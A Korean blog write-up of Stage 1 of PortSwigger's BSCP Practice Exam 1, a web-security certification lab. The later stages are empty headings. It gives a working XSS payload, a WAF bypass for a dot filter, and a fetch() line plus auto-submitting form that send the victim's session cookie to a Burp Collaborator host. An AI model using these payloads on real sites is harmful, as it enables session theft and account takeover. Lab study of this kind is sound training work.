---
title: BSCP Practice Exam 1 풀이 (PortSwigger Academy)
description: PortSwigger BSCP Practice Exam 1을 단계별로 분석하고 공격 흐름을 정리
categories: [Web Security, Writeup]
tags: [웹 보안, 실습, BSCP, PortSwigger Academy]
toc: true
---

# BSCP Practice Exam #1

BSCP 시험준비를 위한 Practice Exam #1 Writeup을 작성해봤다. 
연습 시험은 하나의 타겟 애플리케이션으로 구성되어 있으며, 총 세 단계로 나뉘어 있고 제한 시간은 2시간이다.  
실제 시험에서는 두 개의 애플리케이션을 대상으로 총 여섯 개의 취약점을 이용해야 하며, 제한 시간은 4시간으로 구성되어 있다.  

1단계에서는 초기 사용자 계정 접근(Initial Access),  
2단계에서는 관리자 권한 상승(Privilege Escalation),  
3단계에서는 최종적으로 `/home/carlos/secret` 파일을 읽어오는 Remote Code Execution(RCE)을 수행해야 한다.

물론 이 연습문제도 첫 번째 도전에 두시간 내에 풀지 못했다. 
첫 번째 시도에서는 1단계, 두 번째 시도에서는 2단계까지 진행했고,  
세 번째 도전에서야 3단계까지 완료할 수 있었다.  
두시간 주어진 문제에 풀이에만 6시간정도를 사용했지만, 이번 계기로 더 많은 걸 배울수 있게 돼서 유익했다.

완벽한 풀이는 아니지만 내가 시도해본 방법으로 writeup 시작해보도록 하겠다.

---

## Stage 1: 사용자 계정 접근

사진 (1)

애플리케이션에 접속하면 가장 먼저 Search Bar가 눈에 들어온다.  
XSS 취약점이 있는지 확인하기 위해 간단한 `"><script>alert(1)</script>` 코드를 넣어준다.

사진(2)

입력값이 URL에 그대로 반영되는 것을 확인할 수 있었고, 이를 통해 client-side에서 처리되는 가능성을 의심할 수 있었다.
좀더 확실한 취약점 스캔을 위해 Burp Suite의 Select Scan기능을 이용해 스캔을 해줬다.

사진(3)

스캐닝을 전체적으로 뿌릴수 없기 때문에 선택적으로 의심이 가는 위치에 적절하게 배분해서 사용해주는게 좋다.

사진(4)

스캐닝 결과, DOM-based JavaScript Injection (XSS)에 취약하다는걸 찾아볼 수 있었다.

아래는 `"><script>alert(1)</script>` 코드 입력후 output 결과다

사진(5)

입력값이 그대로 `searchTerm`에 들어가는걸 확인할 수 있다.
여기서 사용할 수 있는 payload는 `\"-alert(1)}//`가 있을수 있겠다.

위 페이로드를 삽입하게 되면  
```json
{"results":[],"searchTerm":"\"-alert(1)} //"};
```
와 같이 파싱처리가 된다.

여기서 quote escape를 통해 `searchTerm`을 닫아주며, `-` 마이너스 연산자를 이용해 표현식을 평가하는 과정에서 `alert(1)`이 실행된다. 그리고 마지막으로 `}`현재 열려있는 JSON 객체를 강제로 닫아주며, `//`로 뒤에 남아있을 나머지 코드를 주석처리 해주게 된다.

사진(6)

사진(7)

> 성공적으로 alert(1)이 성공한 모습

이제 이 취약점을 이용해서 다른 사용자의 계정을 탈취해야한다.
원래라면 Stored XSS로 방문자의 session cookie를 탈취하여 서버로 전달 하는 방법이 있겠지만  
단순히 Reflected XSS이기 때문에 다른 곳을 우회하여 공격을 해야한다.

BSCP에서는 Exploit Server와 Burp Collaborator 두 가지가 주어지는데, 이 두가지를 사용하면 XSS를 통해 피해자의 브라우저에서 임의 요청을 발생시킬 수 있기 때문에, 결과적으로 CSRF와 유사한 공격 흐름을 구성할 수 있다.  

먼저 Exploit Server에 악성 스크립트를 올려두고, 다른 사용자가 이 Exploit Server에 접속하게 되면 스크립트가 실행되면서 해당 취약한 애플리케이션에 document.cookie를 공격자의 Exploit server 혹은 Burp Collaborator에 fetch하게 만들 수 있다.

그전에 session cookie를 탈취할 수 있는지 공격자의 브라우저에서 먼저 실행 해봐야한다.

```
\\"-fetch`("//me41j9nel9z3wowkiq6zv1te85ew2mqb.oastify.com/?cookie="+document.cookie)`} //
```

여기서 `me41j9nel9z3wowkiq6zv1te85ew2mqb.oastify.com`는 Burp Collaborator의 주소이다, 즉 공격자의 주소인 셈이다.
원래대로라면, 공격자의 서버에 현재 애플리케이션의 session cookie를 전달해야한다.

사진(8)

> 전송 결과

하지만 결과는 "Potentially dangerous search term"을 반환한다. 즉, WAF에서 필터링을 하고있다는걸 알 수 있다.
이후에 몇 가지 실험을 통해 어떤 경우에 필터링이 작동하는지 확인해봤고, `.`문자가 포함되면 요청이 막힌다는걸 알아냈다.

`.`을 URL Encoding을 진행해서 아래와 같이 바꿔주었다.

```
\\"-fetch("//me41j9nel9z3wowkiq6zv1te85ew2mqb%2eoastify%2ecom/?cookie="+document%2ecookie)} //
```

하지만 위 경우에는 요청은 전송됐지만 공격자 서버로 session cookie가 전송되지 않았다.  
이는 `document%2ecookie`로 변환되는 과정에서 정상적인 `document.cookie`로 해석되지 않았기 때문으로 보인다.

따라서 위 payload를 아래와 같이 바꿔줬다.

```
\\"-fetch("//me41j9nel9z3wowkiq6zv1te85ew2mqb%2eoastify%2ecom/?cookie="+document['cookie'])} //
```

`document%2ecookie`대신에 `document['cookie']`를 사용하게 되면 `.`을 우회할 수 있기 때문이다.

사진(9)

실행 결과, 성공적으로 공격자의 서버에 세션쿠키가 전달 된 것을 확인할 수 있었다.

이제 session cookie 탈취가 가능하다는것을 확인 했으니 실제 공격자 서버에서 악성스크립트를 삽입해 피해자가 방문하기를 기다린 다음에  
피해자가 이미 인증되어있는 상태를 악용해 CSRF를 통한 Session Cookie탈취를 해볼 예정이다.

```html
<form id="xss" action="https://0af5007d04019674844223a000e800bf.web-security-academy.net/" method="GET">
    <input type="hidden" name="SearchTerm" value='\\"-fetch("//me41j9nel9z3wowkiq6zv1te85ew2mqb%2eoastify%2ecom/?c="+document["cookie"])}//'>
</form>
<script>
    document.getElementById('xss').submit();
</script>
```

위 payload를 만드는데에는 꽤나 오랜시간이 걸렸던 것 같다. 찾아보니 `eval(atob())`를 이용해 내부 코드를 Base64처리해서 실행한 사람들도 있는것 같다.  
해당 방법이 익숙하지 않은 탓에 다방면으로 찾아본 결과, 위와 같은 payload를 만들 수 있었다.

우선 Hidden Form을 생성함으로써 공격 페이로드에 추가해주고 타겟으로 하는 URL에 GET 요청을 포함, 그리고 해당 form을 submit()함수를 이용해 제출한다.  
결과적으로 공격자 서버를 방문한 피해자의 세션을 탈취할 수 있었다.

사진(10)

`session=wMWm4S20Bp89FqOorGDM3MVaVcbyqT4t`

해당 세션 쿠키로 교체해주고나면, 성공적으로 `carlos`유저로 로그인 된것을 확인할 수 있다.

사진(11)

---

## Stage 2: Admin 계정 탈취

---

## Stage 3: 서버 파일 읽기 및 제출

---

## 정리